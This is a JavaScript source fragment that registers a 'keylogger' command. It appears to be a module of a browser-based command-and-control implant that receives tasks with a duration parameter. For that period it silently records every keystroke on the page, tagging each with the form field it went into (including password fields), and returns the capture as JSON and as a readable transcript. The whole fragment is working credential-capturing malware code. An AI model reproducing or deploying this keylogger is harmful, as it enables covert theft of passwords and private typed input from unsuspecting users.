COMMANDS['keylogger'] = async function(task) {
    var params = task.parameters;
    if (typeof params === 'string') {
        try { params = JSON.parse(params); } catch (e) { params = {}; }
    }
    var duration = (params && params.duration) ? parseInt(params.duration) : 60;

    var entries = [];
    var currentField = '';

    function handler(e) {
        var tag = e.target.tagName || '';
        var type = e.target.type || '';
        var name = e.target.name || e.target.id || '';
        var field = tag + (type ? '[' + type + ']' : '') + (name ? '#' + name : '');

        // Log field changes
        if (field !== currentField) {
            currentField = field;
            entries.push({
                ts: new Date().toISOString(),
                event: 'focus',
                field: field
            });
        }

        var keyVal = '';
        if (e.key.length === 1) {
            keyVal = e.key;
        } else {
            keyVal = '[' + e.key + ']';
        }

        // Note modifiers
        var mods = '';
        if (e.ctrlKey) mods += 'Ctrl+';
        if (e.altKey) mods += 'Alt+';
        if (e.metaKey) mods += 'Meta+';
        if (mods && e.key.length > 1) keyVal = mods + keyVal;

        entries.push({
            ts: new Date().toISOString(),
            key: keyVal
        });
    }

    document.addEventListener('keydown', handler, true);

    await new Promise(function(resolve) {
        setTimeout(resolve, duration * 1000);
    });

    document.removeEventListener('keydown', handler, true);

    // Format output
    var output = {
        duration: duration + 's',
        totalKeystrokes: entries.filter(function(e) { return e.key; }).length,
        captureStart: entries.length > 0 ? entries[0].ts : null,
        captureEnd: entries.length > 0 ? entries[entries.length - 1].ts : null,
        entries: entries
    };

    // Also build a readable text stream
    var readable = '';
    for (var i = 0; i < entries.length; i++) {
        if (entries[i].event === 'focus') {
            readable += '\n[' + entries[i].field + '] ';
        } else if (entries[i].key) {
            if (entries[i].key === '[Enter]') {
                readable += '⏎\n';
            } else if (entries[i].key === '[Backspace]') {
                readable += '⌫';
            } else if (entries[i].key === '[Tab]') {
                readable += '⇥';
            } else if (entries[i].key === '[Space]' || entries[i].key === ' ') {
                readable += ' ';
            } else if (entries[i].key.length === 1) {
                readable += entries[i].key;
            } else {
                readable += entries[i].key;
            }
        }
    }
    output.readable = readable.trim();

    return JSON.stringify(output, null, 2);
};
